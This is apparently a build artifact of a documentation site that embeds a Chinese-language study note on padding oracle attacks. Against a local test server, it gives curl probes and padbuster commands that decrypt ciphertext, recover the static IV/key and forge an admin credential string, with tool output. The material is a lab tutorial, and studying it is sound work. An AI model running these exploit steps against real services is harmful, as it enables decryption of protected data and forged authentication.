data\n如果是带iv，flip first byte of the second block，如果是不带iv则flip first byte：简单情况 decryption error或者显示正常信息但是开头是乱码；复杂情况是可能返回 invalid json之类的\n判断是否存在padding oracle，check how the application reacts to incorrect padding\nflip last byte：简单情况是 padding error，复杂情况跟前面类似，如果返回invalid json就基本无解，如果返回missing filed：username之类的还有救，\n比如完整明文是ApplicationUsername=user&Password=sesame，报错missing UserName，\n")])])]),a("p",[t._v("复杂例子分析：")]),t._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v('curl http://127.0.0.1:5000/check?cipher=484b850123a04baf15df9be14e87369bc59ca16e1f3645ef53cc6a4d9d87308ed2382fb0a54f3a2954bfebe0a04dd4d6\n\n484b850123a04baf15df9be14e87369b\tApplicationUsern\nc59ca16e1f3645ef53cc6a4d9d87308e\tame=user&Passwor\nd2382fb0a54f3a2954bfebe0a04dd4d6\td=sesame\n\ndecrypted: ApplicationUsername=user&Password=sesame\n\nparsed: {\'Password\': [\'sesame\'], \'ApplicationUsername\': [\'user\']}\n\n简单情况：\nflip first byte：\ncurl http://127.0.0.1:5000/echo?cipher=ff4b850123a04baf15df9be14e87369bc59ca16e1f3645ef53cc6a4d9d87308ed2382fb0a54f3a2954bfebe0a04dd4d6\n\ndecrypted: �+�]7N�d�����N�me=user&Password=sesame\n\nflip last byte：\ncurl http://127.0.0.1:5000/echo?cipher=484b850123a04baf15df9be14e87369bc59ca16e1f3645ef53cc6a4d9d87308ed2382fb0a54f3a2954bfebe0a04dd4ff\n\ndecryption error\n\n破解：\npadbuster "http://127.0.0.1:5000/echo?cipher=484b850123a04baf15df9be14e87369bc59ca16e1f3645ef53cc6a4d9d87308ed2382fb0a54f3a2954bfebe0a04dd4d6" "484b850123a04baf15df9be14e87369bc59ca16e1f3645ef53cc6a4d9d87308ed2382fb0a54f3a2954bfebe0a04dd4d6" 16 -encoding 1\n\n484b850123a04baf15df9be14e87369b\nc59ca16e1f3645ef53cc6a4d9d87308e\tame=user&Passwor\nd2382fb0a54f3a2954bfebe0a04dd4d6\td=sesame\n\n可以看到不带iv，则第一个区块无法解密出来\n\n复杂情况（echo方法是为了让我们看清内容）：\n\n如果只包含password：\n38d057b13b8aef21dbf9b43b66a6d89a\n# curl http://127.0.0.1:5000/echo?cipher=38d057b13b8aef21dbf9b43b66a6d89a\ndecrypted: Password=sesame\n\n# curl http://127.0.0.1:5000/check?cipher=38d057b13b8aef21dbf9b43b66a6d89a\nApplicationUsername missing\n\n如果只包含Username：\n# curl http://127.0.0.1:5000/echo?cipher=484b850123a04baf15df9be14e87369b309efe9c9fb71ea283dd42e445cc7b54\ndecrypted: ApplicationUsername=user\n\n# curl http://127.0.0.1:5000/check?cipher=484b850123a04baf15df9be14e87369b309efe9c9fb71ea283dd42e445cc7b54\nPassword missing\n\n这种情况下直接这样用padbuster是不行的\n# padbuster "http://127.0.0.1:5000/check?cipher=484b850123a04baf15df9be14e87369bc59ca16e1f3645ef53cc6a4d9d87308ed2382fb0a54f3a2954bfebe0a04dd4d6" "484b850123a04baf15df9be14e87369bc59ca16e1f3645ef53cc6a4d9d87308ed2382fb0a54f3a2954bfebe0a04dd4d6" 16 -encoding 1  \n\nERROR: All of the responses were identical.\nDouble check the Block Size and try again.\n\nWe only need to prepend encrypted data that contains the ‘ApplicationUsername’ field: If the padding is correct then we get a different response. This way we can decrypt all but the first block.\nIn the example below the first two blocks of the ciphertext are prepended when performing the padding oracle attack. This is because the ‘ApplicationUsername’ field spans over two blocks\n\nprefix：484b850123a04baf15df9be14e87369bc59ca16e1f3645ef53cc6a4d9d87308e\npadbuster "http://127.0.0.1:5000/check?cipher=484b850123a04baf15df9be14e87369bc59ca16e1f3645ef53cc6a4d9d87308ed2382fb0a54f3a2954bfebe0a04dd4d6" "484b850123a04baf15df9be14e87369bc59ca16e1f3645ef53cc6a4d9d87308ed2382fb0a54f3a2954bfebe0a04dd4d6" 16 -encoding 1 -error "ApplicationUsername missing" -prefix "484b850123a04baf15df9be14e87369bc59ca16e1f3645ef53cc6a4d9d87308e"\n\name=user&Password=sesame\n跟前面一样不带iv，则第一个区块无法解密出来\n\n--------------------------------------------------------------------\n--- 算出IV:\n--------------------------------------------------------------------\n前面我们都没有加 -noiv这个参数，反言之，padbuster默认就认为是带iv的，所以是将第一个区块block作为iv，然后这里我们明确告知其没有iv，\n虽然没有研究padbuster源码，但是也不难猜测，padbuster肯定是将这个484b850123a04baf15df9be14e87369b作为C1，来算出其中间值的\nlast-byte-of(Dk(C1)) = Intermediary Byte = 0x0g ⊕ 0x01\n然后\nlast-byte-of(P1) = last-byte-of(Dk(C1) ⊕ IV)\n从而算出IV\nIV= last-byte-of(P1) ⊕ last-byte-of(Dk(C1))\n\n# padbuster "http://127.0.0.1:5000/check?cipher=484b850123a04baf15df9be14e87369b" "484b850123a04baf15df9be14e87369b" 16 -encoding 1 -error "ApplicationUsername missing" -prefix "484b850123a04baf15df9be14e87369bc59ca16e1f3645ef53cc6a4d9d87308e" -noiv               \n\n\nBlock 1 Results:\n\n[+] Cipher Text (HEX): 484b850123a04baf15df9be14e87369b\n\n[+] Intermediate Bytes (HEX): 7141425f5d56574351562f1730213728\n\nOnce we have obtained the intermediate value we can XOR it with the plaintext to obtain the encryption key:\n\n0x4170706c69636174696f6e557365726e (plaintext ‘ApplicationUsern’)\nXOR\n0x7141425f5d56574351562f1730213728 (intermediate value)\n=\n0x30313233343536373839414243444546 (key ‘0123456789ABCDEF’)\n\n\n--------------------------------------------------------------------\n--- 加密：\n--------------------------------------------------------------------\nWe can also encrypt arbitrary content (Please refer to the original padbuster blog post on how this works behind the scenes). The only restriction is that it is not possible to control the first block. This is due to the static IV being used. The application would still accept the resulting ciphertext if we terminate the uncontrollable data of the first block with ‘=bla&’. Note that the crafted ciphertext does not have to have the same length as the original one.\n简单来说，跟我们前面讲过的padbuster标准的加密思路一样，由于这里服务器用的是服务器端写死的IV，我们当然是可以算出的，但是完全没必要，因为服务器会把接收到的全部作为密文处理，当然包括第一个区块，所以根据我们前面标准的加密思路，可以知道，我们最终生成的若干个区块的第一个区块的new...new IV绝对是跟服务器端完全不同的了，所以第一个密文区块（这里的例子实际是prefix两个区块）一定是会对应的明文一定会被解密成垃圾，所以这里利用了明文的键值对&规则，通过=bla&将前面无法控制的那堆垃圾作为key，key=bla&这样”终止掉“\n# padbuster "http://127.0.0.1:5000/check?cipher=484b850123a04baf15df9be14e87369b" "484b850123a04baf15df9be14e87369b" 16 -encoding 1 -error "ApplicationUsername missing" -prefix "484b850123a04baf15df9be14e87369bc59ca16e1f3645ef53cc6a4d9d87308e" -plaintext "=bla&ApplicationUsername=admin&Password=admin"\n\n[+] Encrypted value is: 753e2047e19bf24866ae5634f3454ef3a3802d5144a051a7246762f57a16f73531d76ada52422e176ea07e45384df69d00000000000000000000000000000000\n\n\n# curl http://127.0.0.1:5000/check?cipher=753e2047e19bf24866ae5634f3454ef3a3802d5144a051a7246762f57a16f73531d76ada52422e176ea07e45384df69d00000000000000000000000000000000\n\ndecrypted: ��_c�I�B�C���=bla&ApplicationUsername=admin&Password=admin\n\nparsed: {\'\\xf7\\xc1_c\\x9e\\x1cI\\x9aB\\xccC\\x10\\xac\\x07\\x90\\x97\': [\'bla\'], \'Password\': [\'admin\'], \'ApplicationUsername\': [\'admin\']}\n\n')])])]),a("hr"),t._v(" "),a("p",[t._v("ref")]),t._v(" "),a("p",[t._v("https://www.youtube.com/watch?v=7XZdsR0jHjo")]),t._v(" "),a("p",[t._v("https://github.com/lyhistory/Padding-oracle-attack")])])}),[],!1,null,null,null);s.default=e.exports}}]);